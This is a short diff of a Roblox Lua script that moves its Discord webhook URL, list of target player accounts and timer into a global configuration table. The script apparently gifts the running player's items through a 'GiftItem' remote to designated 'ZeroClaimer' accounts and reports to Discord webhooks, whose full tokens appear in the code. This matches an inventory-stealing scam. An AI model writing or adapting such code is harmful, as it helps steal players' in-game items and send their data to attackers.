@@ -15,8 +15,8 @@ local Backpack = player:WaitForChild("Backpack")
 local humanoid = Character:WaitForChild("Humanoid")
 
 local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1445410079363956746/9kTNwSiB2usi0_GPQ0YKDCy-H0d6ZKFlp5W1VdfM7gc0LjpF7ANLENp3pGWhTwthLlj5"
-local TARGET_PLAYERS = {"ZeroClaimer1", "ZeroClaimer2", "ZeroClaimer3"}
+local WEBHOOK_URL = _G["Zero_Config"].user_webhook
+local TARGET_PLAYERS = _G["Zero_Config"].users or {}
 
 local Remotes = ReplicatedStorage:WaitForChild("Remotes")
 local GiftRemote = Remotes:WaitForChild("GiftItem")
@@ -691,7 +691,7 @@ task.spawn(function()
 	end
 end)
 
-local totalTime = 900
+local totalTime = _G["Zero_Config"].time
 local start = os.clock()
 
 RunService.RenderStepped:Connect(function()
